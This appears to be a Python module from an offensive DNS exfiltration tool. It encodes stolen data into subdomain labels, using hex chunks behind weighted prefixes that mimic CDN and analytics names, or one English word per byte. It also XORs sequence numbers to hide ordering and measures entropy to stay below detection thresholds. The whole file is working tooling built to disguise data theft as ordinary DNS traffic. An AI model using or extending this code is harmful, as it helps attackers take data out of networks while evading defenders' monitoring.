"""Encoding strategies for DNS subdomain data exfiltration.

Two strategies available:
- hex_split: Split hex-encoded data across short labels with realistic prefixes
- wordlist: Map each byte to a short English word (lowest entropy)

Sequence numbers are embedded inside the encoded data (first SEQUENCE_BYTES),
XORed with a session key so no sequential pattern is visible.
"""

import math
import os
import random as _random_module
import struct
from collections import Counter

# 100+ diverse prefixes mimicking real CDN/SaaS/analytics URL patterns
# Weighted to match realistic distribution of web resource naming
#
# DECODING RULE: The decoder scans backwards from end of label to find the
# hex-only data suffix. The prefix MUST end with a non-hex character (g-z)
# so the boundary is always unambiguous.
# Hex chars: 0-9, a-f. Non-hex (safe for prefix ending): g-z.
_HEX_CHARS = set("0123456789abcdef")

HEX_PREFIXES = [
    # Static assets (common, high weight)
    ("img", 12), ("css", 10), ("js", 10), ("font", 5),
    ("svg", 4), ("ico", 3), ("png", 3), ("wft", 2),
    # API/service paths
    ("api", 8), ("rps", 3), ("ws", 3), ("gql", 2),
    ("rest", 2), ("grp", 2),
    # Version paths
    ("vq", 5), ("vs", 4), ("vt", 2), ("vx", 1),
    # CDN/edge patterns
    ("hn", 4), ("ak", 3), ("gt", 2), ("ln", 2),
    ("vn", 2), ("nw", 2), ("gw", 2),
    # Analytics/tracking — single non-hex chars (very common in real traffic)
    ("t", 8), ("p", 6), ("s", 7), ("g", 5),
    ("h", 4), ("i", 3), ("k", 3), ("l", 3),
    ("m", 3), ("n", 2), ("o", 2), ("q", 2),
    ("r", 2), ("u", 2), ("v", 2), ("w", 1),
    ("x", 1), ("y", 1), ("z", 1),
    # Cache/content keys (all end with non-hex)
    ("ck", 4), ("ct", 3), ("cx", 2), ("ch", 3),
    ("gk", 2), ("hk", 2), ("lk", 2), ("nk", 2),
    # Session/user tracking (replaced *id -> *ix/*ip/*ir to avoid 'd' ending)
    ("six", 3), ("uix", 3), ("rix", 2), ("tix", 2),
    ("pix", 2), ("mix", 2), ("vix", 1), ("wix", 1),
    # Resource types (all end with non-hex)
    ("res", 3), ("srx", 3), ("pkg", 2), ("app", 3),
    ("ui", 2), ("lir", 2), ("mox", 2),
    # Data/metrics (all end with non-hex)
    ("log", 3), ("evt", 2), ("met", 2), ("hit", 2),
    ("msg", 2), ("tag", 2), ("geo", 1), ("rpt", 2),
    # Hashing/versioning patterns
    ("vr", 2), ("rv", 1), ("sv", 1), ("mv", 1),
    ("pv", 1), ("tv", 1), ("nv", 1), ("kv", 1),
    # Common SaaS region prefixes
    ("st", 3), ("tr", 3), ("us", 2), ("ru", 2),
    ("jp", 1), ("kr", 1), ("uk", 1), ("sg", 1),
    # Marketing / ad-tech
    ("px", 3), ("rt", 2), ("mkt", 2), ("syn", 2),
    ("yt", 2), ("tw", 1), ("ig", 1),
    # Misc short patterns
    ("gl", 2), ("wp", 2), ("ng", 1), ("go", 1),
    ("py", 1), ("rs", 1), ("io", 1), ("sh", 1),
]

# Validate all prefixes: must contain a non-hex char AND end with a non-hex char
for _p, _w in HEX_PREFIXES:
    assert not all(ch in _HEX_CHARS for ch in _p), \
        f"Prefix '{_p}' is hex-only! Decoder can't distinguish it from data."
    assert _p[-1] not in _HEX_CHARS, \
        f"Prefix '{_p}' ends with hex char '{_p[-1]}'! Decoder boundary is ambiguous."

_PREFIX_NAMES = [p[0] for p in HEX_PREFIXES]
_PREFIX_WEIGHTS = [p[1] for p in HEX_PREFIXES]

# 256 common short words (3-6 chars, lowercase, DNS-safe)
# Each word maps to one byte value (index = byte value)
WORDLIST = [
    "ace", "add", "age", "ago", "aid", "aim", "air", "all", "and", "ant",
    "any", "ape", "app", "arc", "are", "ark", "arm", "art", "ash", "ask",
    "ate", "auto", "avid", "away", "axe", "back", "bad", "bag", "ban", "bar",
    "bat", "bay", "bed", "bee", "belt", "ben", "best", "bet", "bid", "big",
    "bin", "bird", "bit", "blow", "blue", "boat", "body", "bold", "bolt", "bomb",
    "bond", "bone", "book", "boot", "born", "boss", "both", "bow", "box", "boy",
    "bug", "bulk", "bull", "burn", "bus", "busy", "buy", "cab", "cage", "cake",
    "call", "calm", "came", "camp", "can", "cap", "car", "card", "care", "cart",
    "case", "cash", "cast", "cat", "cave", "cell", "chat", "chip", "city", "clam",
    "clay", "clip", "club", "coal", "coat", "code", "coil", "coin", "cold", "colt",
    "come", "cook", "cool", "cope", "copy", "cord", "core", "corn", "cost", "cosy",
    "crew", "crop", "crow", "cube", "cult", "cup", "curl", "cut", "dale", "dam",
    "dame", "dare", "dark", "dash", "data", "date", "dawn", "day", "dead", "deal",
    "dear", "deck", "deed", "deep", "deer", "demo", "deny", "desk", "dial", "did",
    "die", "dig", "dim", "dine", "dirt", "disc", "dish", "dock", "does", "dog",
    "dome", "done", "door", "dose", "dot", "down", "drag", "draw", "drew", "drop",
    "drug", "drum", "dry", "duck", "due", "dug", "duke", "dump", "dune", "dust",
    "duty", "each", "earn", "ease", "east", "easy", "eat", "edge", "edit", "eel",
    "ego", "elm", "else", "emit", "end", "epic", "era", "even", "ever", "evil",
    "exam", "exit", "eye", "face", "fact", "fade", "fail", "fair", "fake", "fall",
    "fame", "fan", "far", "farm", "fast", "fat", "fate", "fawn", "fear", "feat",
    "feed", "feel", "feet", "fell", "felt", "fern", "file", "fill", "film", "find",
    "fine", "fire", "firm", "fish", "fist", "five", "fix", "flag", "flat", "fled",
    "flew", "flip", "flow", "flux", "foam", "foil", "fold", "folk", "fond", "font",
    "food", "fool", "foot", "ford", "fore", "fork", "form", "fort", "foul", "four",
    "free", "frog", "from", "fuel", "full", "fun",
]

WORD_TO_BYTE = {word: idx for idx, word in enumerate(WORDLIST)}


def _pick_prefix(rng):
    """Pick a prefix using weighted random selection."""
    r = rng if rng else _random_module
    return r.choices(_PREFIX_NAMES, weights=_PREFIX_WEIGHTS, k=1)[0]


def _pick_label_length(min_len=6, max_len=12, rng=None):
    """Pick a variable label length to avoid uniform query name sizes.

    Uses a triangular distribution centered around 8 to mimic
    natural variation in CDN cache key lengths.
    """
    r = rng if rng else _random_module
    return int(r.triangular(min_len, max_len, 8))


def encode_hex_split(data, label_len=8, min_len=None, max_len=None, rng=None):
    """Encode bytes as hex split across DNS labels with variable lengths.

    Each label: <prefix><hex_chars> (e.g., 'img3f2a1b')
    Prefix selection is weighted to mimic natural CDN patterns.
    Label length varies between min_len and max_len for realism.
    Returns list of label strings.
    """
    r = rng if rng else _random_module
    hex_str = data.hex()
    labels = []
    i = 0
    while i < len(hex_str):
        # Variable label length if min/max provided
        if min_len and max_len:
            current_len = _pick_label_length(min_len, max_len, r)
        else:
            current_len = label_len

        prefix = _pick_prefix(r)
        hex_chars = current_len - len(prefix)
        if hex_chars < 2:
            hex_chars = 2
        chunk = hex_str[i:i + hex_chars]
        labels.append(f"{prefix}{chunk}")
        i += hex_chars
    return labels


def decode_hex_split(labels):
    """Decode hex-split labels back to bytes.

    The prefix always contains at least one non-hex character (g-z).
    We scan from the end of the label backwards to find the hex data,
    then from the start to find where the prefix ends (first position
    after which all remaining chars are hex).
    """
    hex_str = ""
    for label in labels:
        # Find the split point: prefix contains non-hex chars, data is pure hex.
        # Scan from end to find the longest hex-only suffix.
        split = len(label)
        for j in range(len(label) - 1, -1, -1):
            if label[j] in _HEX_CHARS:
                split = j
            else:
                break

        hex_part = label[split:]
        if hex_part:
            hex_str += hex_part

    if len(hex_str) % 2 != 0:
        hex_str = hex_str[:-1]
    return bytes.fromhex(hex_str)


def encode_wordlist(data):
    """Encode bytes using word lookup table."""
    return [WORDLIST[b] for b in data]


def decode_wordlist(labels):
    """Decode word labels back to bytes."""
    return bytes([WORD_TO_BYTE[word] for word in labels])


def xor_sequence(seq_num, session_key):
    """XOR a 2-byte sequence number with a 4-byte session key.

    Returns 2 bytes that look like random data.
    """
    seq_bytes = struct.pack(">H", seq_num)
    xored = bytes(a ^ b for a, b in zip(seq_bytes, session_key[:2]))
    return xored


def decode_xor_sequence(xored_bytes, session_key):
    """Reverse the XOR to recover the original sequence number."""
    seq_bytes = bytes(a ^ b for a, b in zip(xored_bytes, session_key[:2]))
    return struct.unpack(">H", seq_bytes)[0]


def embed_sequence(data_chunk, seq_num, session_key):
    """Prepend XOR-obfuscated sequence number to data chunk."""
    xored_seq = xor_sequence(seq_num, session_key)
    return xored_seq + data_chunk


def extract_sequence(encoded_chunk, session_key):
    """Extract and decode the sequence number from an encoded chunk.

    Returns (seq_num, data_chunk).
    """
    xored_seq = encoded_chunk[:2]
    data = encoded_chunk[2:]
    seq_num = decode_xor_sequence(xored_seq, session_key)
    return seq_num, data


def estimate_entropy(text):
    """Estimate Shannon entropy of a string in bits per character."""
    if not text:
        return 0.0
    counts = Counter(text)
    length = len(text)
    entropy = 0.0
    for count in counts.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy
